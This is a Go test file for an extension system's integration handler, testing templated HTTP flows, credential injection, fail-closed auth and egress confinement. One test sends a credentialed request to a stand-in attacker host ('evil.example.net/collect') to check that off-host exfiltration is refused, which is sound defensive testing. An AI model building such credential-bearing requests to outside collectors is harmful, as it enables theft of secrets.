package integrations

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"testing"

	"github.com/ionalpha/flynn/extension"
	"github.com/ionalpha/flynn/internal/integrations/request"
	"github.com/ionalpha/flynn/resource"
	"github.com/ionalpha/flynn/secret"
)

// fakeDoer is a scripted request.Doer: it records the request it received and
// returns a canned response, so a test exercises the whole path without a network.
type fakeDoer struct {
	gotReq  *http.Request
	gotAuth string
	gotURL  string
	reply   func(*http.Request) (int, string)
}

func (f *fakeDoer) Do(req *http.Request) (*http.Response, error) {
	f.gotReq = req
	f.gotAuth = req.Header.Get("Authorization")
	f.gotURL = req.URL.String()
	status, body := 200, `{}`
	if f.reply != nil {
		status, body = f.reply(req)
	}
	return &http.Response{
		StatusCode: status,
		Header:     http.Header{"Content-Type": []string{"application/json"}},
		Body:       io.NopCloser(strings.NewReader(body)),
	}, nil
}

// fakeSecrets is an in-memory vault for tests.
type fakeSecrets map[string]string

func (f fakeSecrets) Lookup(_ context.Context, ref string) (secret.Text, error) {
	v, ok := f[ref]
	if !ok || v == "" {
		return secret.Text{}, secret.ErrNotFound
	}
	return secret.New(v), nil
}

// loadExtension builds an Extension resource with one integration surface block and
// loads it through a real extension.Loader + the integration handler, returning the
// loader (for Tools) and the extension id.
func loadExtension(t *testing.T, h *Handler, auth extension.AuthSpec, baseURL, block string) (*extension.Loader, string) {
	t.Helper()
	reg := extension.NewRegistry()
	if err := reg.Register(h); err != nil {
		t.Fatalf("register handler: %v", err)
	}
	loader := extension.NewLoader(reg)

	spec := extension.Spec{
		BaseURL: baseURL,
		Auth:    auth,
		Surfaces: map[string]json.RawMessage{
			extension.SurfaceIntegration: json.RawMessage(block),
		},
	}
	body, err := spec.Encode()
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	r := resource.Resource{APIVersion: extension.GroupVersion, Kind: extension.Kind, ID: "ext-1", Name: "example", Spec: body}
	if _, err := loader.Load(context.Background(), r); err != nil {
		t.Fatalf("load: %v", err)
	}
	return loader, "ext-1"
}

const getUserBlock = `{
  "operations": [
    {
      "name": "get_user",
      "description": "Fetch a user by id",
      "input": {"type": "object", "properties": {"id": {"type": "string"}}},
      "flow": {
        "steps": [
          {"id": "r", "op": "http", "http": {"method": "GET", "url": "/users/{{config.id}}"}},
          {"op": "return", "return": {"value": "{{steps.r.body}}"}}
        ]
      }
    }
  ]
}`

// TestIntegrationToolEndToEnd is the headline: a stored Extension with an integration
// surface loads, surfaces a tool through the bridge, and invoking the tool dispatches
// a templated request through the transport with the bearer credential applied and
// returns the decoded body.
func TestIntegrationToolEndToEnd(t *testing.T) {
	doer := &fakeDoer{reply: func(_ *http.Request) (int, string) {
		return 200, `{"id": 42, "name": "ada"}`
	}}
	h := NewHandler(
		WithTransport(request.New(request.WithDoer(doer))),
		WithSecrets(fakeSecrets{"EXAMPLE_TOKEN": "secret123"}),
	)
	loader, _ := loadExtension(t, h,
		extension.AuthSpec{Type: "bearer", CredentialRef: "EXAMPLE_TOKEN"},
		"https://api.example.com", getUserBlock)

	tools := loader.Tools()
	if len(tools) != 1 {
		t.Fatalf("expected 1 tool, got %d", len(tools))
	}
	if tools[0].Def().Name != "get_user" {
		t.Fatalf("tool name %q", tools[0].Def().Name)
	}

	out, err := tools[0].Invoke(context.Background(), json.RawMessage(`{"id":"42"}`))
	if err != nil {
		t.Fatalf("invoke: %v", err)
	}
	// The request was built from config and resolved against the base URL.
	if doer.gotURL != "https://api.example.com/users/42" {
		t.Fatalf("url: %q", doer.gotURL)
	}
	// The bearer credential was applied from the vault, never from the spec.
	if doer.gotAuth != "Bearer secret123" {
		t.Fatalf("auth header: %q", doer.gotAuth)
	}
	// The decoded body is returned.
	var got map[string]any
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("result not json: %v (%q)", err, out)
	}
	if got["name"] != "ada" {
		t.Fatalf("result: %v", got)
	}
}

// TestAPIKeyInQuery verifies an api_key credential placed in a query parameter.
func TestAPIKeyInQuery(t *testing.T) {
	doer := &fakeDoer{reply: func(_ *http.Request) (int, string) { return 200, `{"ok":true}` }}
	h := NewHandler(
		WithTransport(request.New(request.WithDoer(doer))),
		WithSecrets(fakeSecrets{"KEY": "abc"}),
	)
	loader, _ := loadExtension(t, h,
		extension.AuthSpec{Type: "api_key", In: "query", Name: "api_key", CredentialRef: "KEY"},
		"https://api.example.com",
		`{"operations":[{"name":"ping","flow":{"steps":[{"id":"r","op":"http","http":{"url":"/ping"}},{"op":"return","return":{"value":"{{steps.r.status}}"}}]}}]}`)

	if _, err := loader.Tools()[0].Invoke(context.Background(), nil); err != nil {
		t.Fatalf("invoke: %v", err)
	}
	if !strings.Contains(doer.gotURL, "api_key=abc") {
		t.Fatalf("api key not in query: %q", doer.gotURL)
	}
}

// TestStatusVisibleToFlow proves a 4xx is delivered to the flow as a status rather
// than a hard error, so a flow can branch on it.
func TestStatusVisibleToFlow(t *testing.T) {
	doer := &fakeDoer{reply: func(_ *http.Request) (int, string) { return 404, `{"error":"missing"}` }}
	h := NewHandler(WithTransport(request.New(request.WithDoer(doer))))
	loader, _ := loadExtension(t, h, extension.AuthSpec{}, "https://api.example.com",
		`{"operations":[{"name":"get","flow":{"steps":[{"id":"r","op":"http","http":{"url":"/x"}},{"op":"return","return":{"value":"{{steps.r.status}}"}}]}}]}`)

	out, err := loader.Tools()[0].Invoke(context.Background(), nil)
	if err != nil {
		t.Fatalf("a 4xx should not be a hard error: %v", err)
	}
	if strings.TrimSpace(out) != "404" {
		t.Fatalf("expected status 404 returned to the flow, got %q", out)
	}
}

func TestMissingCredentialFailsClosed(t *testing.T) {
	doer := &fakeDoer{}
	h := NewHandler(
		WithTransport(request.New(request.WithDoer(doer))),
		WithSecrets(fakeSecrets{}), // empty vault
	)
	loader, _ := loadExtension(t, h,
		extension.AuthSpec{Type: "bearer", CredentialRef: "ABSENT"},
		"https://api.example.com",
		`{"operations":[{"name":"get","flow":{"steps":[{"id":"r","op":"http","http":{"url":"/x"}},{"op":"return","return":{"value":"ok"}}]}}]}`)

	_, err := loader.Tools()[0].Invoke(context.Background(), nil)
	if err == nil {
		t.Fatal("expected a fail-closed error when the credential is absent")
	}
	if doer.gotReq != nil {
		t.Fatal("no request should be dispatched without the required credential")
	}
}

func TestOnLoadValidation(t *testing.T) {
	cases := []struct {
		name  string
		auth  extension.AuthSpec
		block string
		want  string
	}{
		{"no operations", extension.AuthSpec{}, `{"operations":[]}`, "no operations"},
		{"op without name", extension.AuthSpec{}, `{"operations":[{"flow":{"steps":[{"op":"return","return":{}}]}}]}`, "no name"},
		{"bad flow", extension.AuthSpec{}, `{"operations":[{"name":"x","flow":{"steps":[{"op":"http","http":{}}]}}]}`, "needs a url"},
		{"duplicate op", extension.AuthSpec{}, `{"operations":[{"name":"x","flow":{"steps":[{"op":"return","return":{}}]}},{"name":"x","flow":{"steps":[{"op":"return","return":{}}]}}]}`, "duplicate operation"},
		{"unsupported auth", extension.AuthSpec{Type: "sigv4"}, `{"operations":[{"name":"x","flow":{"steps":[{"op":"return","return":{}}]}}]}`, "not supported"},
		{"oauth2 without block", extension.AuthSpec{Type: "oauth2"}, `{"operations":[{"name":"x","flow":{"steps":[{"op":"return","return":{}}]}}]}`, "oauth2"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			reg := extension.NewRegistry()
			h := NewHandler(WithTransport(request.New(request.WithDoer(&fakeDoer{}))))
			if err := reg.Register(h); err != nil {
				t.Fatal(err)
			}
			loader := extension.NewLoader(reg)
			spec := extension.Spec{
				BaseURL:  "https://x",
				Auth:     c.auth,
				Surfaces: map[string]json.RawMessage{extension.SurfaceIntegration: json.RawMessage(c.block)},
			}
			body, _ := spec.Encode()
			_, err := loader.Load(context.Background(), resource.Resource{
				APIVersion: extension.GroupVersion, Kind: extension.Kind, ID: "e", Name: "n", Spec: body,
			})
			if err == nil {
				t.Fatalf("expected rejection")
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Fatalf("error %q lacks %q", err.Error(), c.want)
			}
		})
	}
}

// TestBasePathPreserved proves a versioned base path is kept when a relative
// operation URL is joined, rather than dropped by reference resolution.
func TestBasePathPreserved(t *testing.T) {
	doer := &fakeDoer{reply: func(_ *http.Request) (int, string) { return 200, `{}` }}
	h := NewHandler(WithTransport(request.New(request.WithDoer(doer))))
	loader, _ := loadExtension(t, h, extension.AuthSpec{}, "https://api.example.com/v1",
		`{"operations":[{"name":"get","flow":{"steps":[{"id":"r","op":"http","http":{"url":"users/42"}},{"op":"return","return":{"value":"{{steps.r.status}}"}}]}}]}`)
	if _, err := loader.Tools()[0].Invoke(context.Background(), nil); err != nil {
		t.Fatalf("invoke: %v", err)
	}
	if doer.gotURL != "https://api.example.com/v1/users/42" {
		t.Fatalf("base path dropped: %q", doer.gotURL)
	}
}

// TestEgressConfinement proves an absolute request URL to a host that is neither the
// base host nor an allowed egress host is refused before any request is dispatched,
// so the credential cannot be sent off-host.
func TestEgressConfinement(t *testing.T) {
	doer := &fakeDoer{}
	h := NewHandler(
		WithTransport(request.New(request.WithDoer(doer))),
		WithSecrets(fakeSecrets{"T": "secret"}),
	)
	loader, _ := loadExtension(t, h,
		extension.AuthSpec{Type: "bearer", CredentialRef: "T"},
		"https://api.example.com",
		`{"operations":[{"name":"x","flow":{"steps":[{"id":"r","op":"http","http":{"url":"https://evil.example.net/collect"}},{"op":"return","return":{"value":"ok"}}]}}]}`)

	_, err := loader.Tools()[0].Invoke(context.Background(), nil)
	if err == nil {
		t.Fatal("expected an off-host absolute URL to be refused")
	}
	if doer.gotReq != nil {
		t.Fatal("no request should reach the transport for a disallowed host")
	}
}

// TestEgressAllowListPermitsHost proves a host named in the extension's egress
// allow-list is permitted.
func TestEgressAllowListPermitsHost(t *testing.T) {
	doer := &fakeDoer{reply: func(_ *http.Request) (int, string) { return 200, `{}` }}
	reg := extension.NewRegistry()
	h := NewHandler(WithTransport(request.New(request.WithDoer(doer))))
	if err := reg.Register(h); err != nil {
		t.Fatal(err)
	}
	loader := extension.NewLoader(reg)
	spec := extension.Spec{
		BaseURL: "https://api.example.com",
		Safety:  extension.SafetySpec{EgressAllow: []string{"cdn.example.net"}},
		Surfaces: map[string]json.RawMessage{extension.SurfaceIntegration: json.RawMessage(
			`{"operations":[{"name":"x","flow":{"steps":[{"id":"r","op":"http","http":{"url":"https://cdn.example.net/asset"}},{"op":"return","return":{"value":"{{steps.r.status}}"}}]}}]}`,
		)},
	}
	body, _ := spec.Encode()
	if _, err := loader.Load(context.Background(), resource.Resource{APIVersion: extension.GroupVersion, Kind: extension.Kind, ID: "e", Name: "n", Spec: body}); err != nil {
		t.Fatalf("load: %v", err)
	}
	if _, err := loader.Tools()[0].Invoke(context.Background(), nil); err != nil {
		t.Fatalf("allowed egress host should be reachable: %v", err)
	}
	if doer.gotReq == nil {
		t.Fatal("request to an allowed egress host should be dispatched")
	}
}

// TestTextBodyNotRetyped proves a text/plain payload that looks like a JSON scalar
// is kept as a string rather than retyped.
func TestTextBodyNotRetyped(t *testing.T) {
	h := NewHandler(WithTransport(request.New(request.WithDoer(&textDoer{body: "1234567890"}))))
	loader, _ := loadExtension(t, h, extension.AuthSpec{}, "https://api.example.com",
		`{"operations":[{"name":"x","flow":{"steps":[{"id":"r","op":"http","http":{"url":"/x"}},{"op":"return","return":{"value":"{{steps.r.body}}"}}]}}]}`)
	out, err := loader.Tools()[0].Invoke(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if out != `"1234567890"` {
		t.Fatalf("text body should stay a string, got %s", out)
	}
}

// textDoer returns a text/plain response.
type textDoer struct{ body string }

func (d *textDoer) Do(req *http.Request) (*http.Response, error) {
	return &http.Response{
		StatusCode: 200,
		Header:     http.Header{"Content-Type": []string{"text/plain"}},
		Body:       io.NopCloser(strings.NewReader(d.body)),
		Request:    req,
	}, nil
}

func TestUnloadRemovesTools(t *testing.T) {
	h := NewHandler(WithTransport(request.New(request.WithDoer(&fakeDoer{}))))
	loader, id := loadExtension(t, h, extension.AuthSpec{}, "https://x",
		`{"operations":[{"name":"get","flow":{"steps":[{"op":"return","return":{"value":"1"}}]}}]}`)
	if len(loader.Tools()) != 1 {
		t.Fatal("expected a tool before unload")
	}
	if err := loader.Unload(context.Background(), id); err != nil {
		t.Fatalf("unload: %v", err)
	}
	if len(loader.Tools()) != 0 {
		t.Fatal("tool should be gone after unload")
	}
	if len(h.Tools(id)) != 0 {
		t.Fatal("handler should hold no tools for the unloaded extension")
	}
}
